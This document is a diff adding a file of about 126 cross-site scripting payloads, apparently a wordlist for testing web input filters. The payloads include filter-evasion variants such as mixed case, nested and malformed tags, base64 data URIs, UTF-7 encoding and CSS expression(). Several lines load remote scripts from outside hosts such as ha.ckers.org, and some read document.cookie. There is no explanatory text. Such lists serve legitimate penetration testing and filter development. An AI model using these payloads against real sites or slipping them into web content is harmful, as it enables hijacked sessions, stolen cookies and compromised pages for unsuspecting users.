@@ -1,0 +1,126 @@
+<script>alert(123);</script>
+<ScRipT>alert("XSS");</ScRipT>
+<script>alert(123)</script>
+<script>alert("hellox worldss");</script>
+<script>alert(/XSS/)</script>
+</script><script>alert(1)</script>
+<ScRiPt>alert(1)</sCriPt>
+<img src=xss onerror=alert(1)>
+<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
+<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
+<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
+http://www.google<script .com>alert(document.location)</script
+<script ^__^>alert(String.fromCharCode(49))</script ^__^
+<div/style="width:expression(confirm(1))">X</div> {IE7}
+/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
+//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\
+</plaintext\></|\><plaintext/onmouseover=prompt(1)
+<var onmouseover="prompt(1)">On Mouse Over</var>
+<img src="/" =_=" title="onerror='prompt(1)'">
+<script src="data:text/javascript,alert(1)"></script>
+<iframe/src \/\/onload = prompt(1)
+<iframe/onreadystatechange=alert(1)
+<svg/onload=alert(1)
+<input value=<><iframe/src=javascript:confirm(1)
+<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
+http://www.<script>alert(1)</script .com
+<svg><script ?>alert(1)
+<img src=`xx:xx`onerror=alert(1)>
+<math><a xlink:href="//jsfiddle.net/t846h/">click
+<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>
+<svg contentScriptType=text/vbs><script>MsgBox+1
+<script>+-+-1-+-+alert(1)</script>
+<script itworksinallbrowsers>/*<script* */alert(1)</script
+<img src ?itworksonchrome?\/onerror = alert(1)
+<svg><script onlypossibleinopera:-)> alert(1)
+<script x> alert(1) </script 1=2
+<div/onmouseover='alert(1)'> style="x:">
+<--`<img/src=` onerror=alert(1)> --!>
+"><img src=x onerror=window.open('https://www.google.com/');>
+<math><a xlink:href="//jsfiddle.net/t846h/">click
+<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>
+<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>
+foo<script>alert(1)</script>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<iframe src=http://ha.ckers.org/scriptlet.html <
+javascript:alert("hellox worldss")
+<img src="javascript:alert('XSS');">
+<"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
+<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+<"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+<h1><font color=blue>hellox worldss</h1>
+<BODY ONLOAD=alert('hellox worldss')>
+<input onfocus=write(XSS) autofocus>
+<input onblur=write(XSS) autofocus><input autofocus>
+<body onscroll=alert(XSS)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+<form><button formaction="javascript:alert(XSS)">lol
+<!--<img src="--><img src=x onerror=alert(XSS)//">
+<![><img src="]><img src=x onerror=alert(XSS)//">
+<style><img src="</style><img src=x onerror=alert(XSS)//">
+<? foo="><script>alert(1)</script>">
+<! foo="><script>alert(1)</script>">
+</ foo="><script>alert(1)</script>">
+<? foo="><x foo='?><script>alert(1)</script>'>">
+<! foo="[[[Inception]]"><x foo="]foo><script>alert(1)</script>">
+<svg xmlns="http://www.w3.org/2000/svg">LOL<script>alert(123)</script></svg>
+\\";alert('XSS');//
+d=\"alert('XSS');\\")\";
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=javascrscriptipt:alert('XSS')>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
+\";alert('XSS');//
+</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+<TABLE BACKGROUND="javascript:alert('XSS')">
+<TABLE><TD BACKGROUND="javascript:alert('XSS')">
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<DIV STYLE="width: expression(alert('XSS'));">
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+<XSS STYLE="xss:expression(alert('XSS'))">
+<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
+a="get";b="URL(ja\"";c="vascr";d="ipt:ale";e="rt('XSS');\")";eval(a+b+c+d+e);
+<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<form id="test" /><button form="test" formaction="javascript:alert(123)">TESTHTML5FORMACTION
+<form><button formaction="javascript:alert(123)">crosssitespt
+<frameset onload=alert(123)>
+<!--<img src="--><img src=x onerror=alert(123)//">
+<style><img src="</style><img src=x onerror=alert(123)//">
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<embed src="javascript:alert(1)">
+<? foo="><script>alert(1)</script>">
+<! foo="><script>alert(1)</script>">
+</ foo="><script>alert(1)</script>">
+<script>ReferenceError.prototype.__defineGetter__('name', function(){alert(123)}),x</script>
+<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()</script>
+<script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script>
++ADw-script+AD4-alert(document.location)+ADw-/script+AD4-
++ACIAPgA8-script+AD4-alert(document.location)+ADw-/script+AD4APAAi-
+foo<script>alert(document.cookie)</script>
+<scr<script>ipt>alert(document.cookie)</scr</script>ipt>
+</script><script >alert(document.cookie)</script>
+<img src=asdf onerror=alert(document.cookie)>
+<script>alert(1)</script>
+"><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>
+<video src=1 onerror=alert(1)>
+<audio src=1 onerror=alert(1)>
